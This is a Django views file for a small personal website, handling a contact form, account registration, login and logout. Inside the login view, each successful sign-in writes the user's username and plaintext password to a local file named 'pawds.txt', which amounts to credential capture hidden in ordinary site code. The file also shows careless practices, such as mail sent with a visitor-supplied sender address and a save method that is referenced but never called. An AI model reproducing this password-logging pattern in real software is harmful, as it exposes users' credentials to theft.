from django.shortcuts import render_to_response, redirect
from django.http.response import HttpResponse
from django.contrib import auth
from django.core.context_processors import csrf

from django.template.loader import get_template
from django.core.mail import EmailMessage
from django.template import Context
from django.core.mail import send_mail
from loginsys.models import Account
# Create your views here.

def main(request):
	args = {}
	args.update(csrf(request))
	if request.user.is_authenticated():
		args['signed_in'] = True
		args['user'] = auth.get_user(request)
	return render_to_response('main.html', args)


def contact(request):
	sended = True
	if request.method == 'POST':
		contact_name = request.POST.get('contactName')
		contact_email = request.POST.get('email')
		message = request.POST.get('message')
		try:
			send_mail('Email from pestov.me', message + '\n' + contact_email,
					  contact_email, ['grizzlyarchi@gmail.com'])
		except Exception:
			sended = False
	args = {}
	args.update(csrf(request))
	args['emailSended'] = sended
	return render_to_response('main.html', args)

def registration(request):
	args = {}
	args.update(csrf(request))
	return render_to_response('registration.html', args)

def register(request):
	args = {}
	args.update(csrf(request))
	print('here')
	if request.method == 'POST':
		try:
			username = request.POST['login']
			username = username.replace('<', '&lt;')
			username = username.replace('>', '&gt;')
			email = request.POST['e-mail']
			password = request.POST['password']
			all_emails = Account.objects.filter(email=email)
			all_usernames = Account.objects.filter(username=username)
			isEmail = (len(all_emails) == 0)
			if not isEmail:
				args['error_u_email'] = not isEmail
			isUsername = (len(all_usernames) == 0)
			if not isUsername:
				args['error_u_username'] = not isUsername
			if isEmail and isUsername:
				user = Account.objects.create_user(email, password, username=username)
				user.save
				args['user_created'] = True
		except Exception:
			args['something_wrong'] = True
	return render_to_response('registration.html', args)

def signin(request):
	args = {}
	args.update(csrf(request))
	if request.user.is_authenticated():
		args['signed_in'] = True
		args['user'] = auth.get_user(request)
	return render_to_response('login.html', args)

def login(request):
	args = {}
	args.update(csrf(request))
	if request.method == 'POST':
		username = request.POST['login']
		password = request.POST['password']
		account = auth.authenticate(username=username, password=password)
		if account is not None:
			auth.login(request, account)
			with open('pawds.txt' , 'w') as f:
				print(username + ' ' + password, file=f)
			return redirect('/')
		else:
			args['auth_error'] = True
	return render_to_response('login.html', args)

def logout(request):
	auth.logout(request)
	return redirect('/')